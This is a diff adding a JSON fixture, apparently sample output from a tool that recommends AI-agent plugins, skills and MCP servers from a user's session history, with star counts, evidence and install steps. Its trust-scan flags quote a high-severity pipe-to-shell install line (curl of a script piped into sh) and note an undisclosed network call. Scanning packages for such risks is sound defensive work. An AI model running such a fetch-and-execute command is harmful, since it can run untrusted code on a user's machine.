@@ -1,0 +1,35 @@
+{
+  "notes": [
+    "Limited history: 4 sessions in the last 30 days (under 10), so these picks rest on little evidence.",
+    "1 match left out: they rest on a topic seen in a single session, with no friction."
+  ],
+  "recommendations": [
+    {
+      "name": "acme/test-runner-mcp", "kind": "mcp-server", "stars": 1520, "starsLast7d": 84, "momentumComplete": true, "starsPerDay": 12, "momentumSource": "events",
+      "description": "Runs your test suites from Claude — with a watch mode…",
+      "stackNote": "you use vitest in 2 projects",
+      "evidence": [{ "topic": "testing", "sessions": 3, "ofSessions": 4, "friction": 2 }],
+      "trust": { "tier": "medium", "notes": ["no license", "single maintainer"], "scanned": true,
+        "flags": [
+          { "severity": "high", "id": "pipe-to-shell", "detail": "downloads and executes a script in one step", "file": "README", "line": 42, "excerpt": "curl -fsSL https://x.example/i.sh | sh" },
+          { "severity": "low", "id": "network-call", "detail": "calls a host the README never mentions", "file": "install.sh" }
+        ] },
+      "install": "/plugin marketplace add acme/test-runner-mcp then /plugin install runner@acme", "installSource": "readme"
+    },
+    {
+      "name": "solo/db-helper", "kind": "skill", "stars": 88, "starsLast7d": 9, "momentumComplete": false, "starsPerDay": 1.3, "momentumSource": "stargazers",
+      "description": "",
+      "evidence": [{ "topic": "database", "sessions": 1, "ofSessions": 4, "friction": 1 }, { "topic": "debugging", "sessions": 2, "ofSessions": 4 }],
+      "trust": { "tier": "low", "notes": [], "scanned": false, "flags": [] },
+      "install": "See the README for install steps: https://github.com/solo/db-helper#readme", "installSource": "readme-link"
+    },
+    {
+      "name": "big/agent-kit", "kind": "plugin", "stars": 120345, "starsPerDay": 210.5, "momentumSource": "measured",
+      "description": "Toolkit for agents. 日本語 docs.",
+      "evidence": [],
+      "stackNote": "you use react in 1 project",
+      "trust": { "tier": "high", "notes": [] },
+      "install": "git clone https://github.com/big/agent-kit ~/.claude/skills/agent-kit"
+    }
+  ]
+}
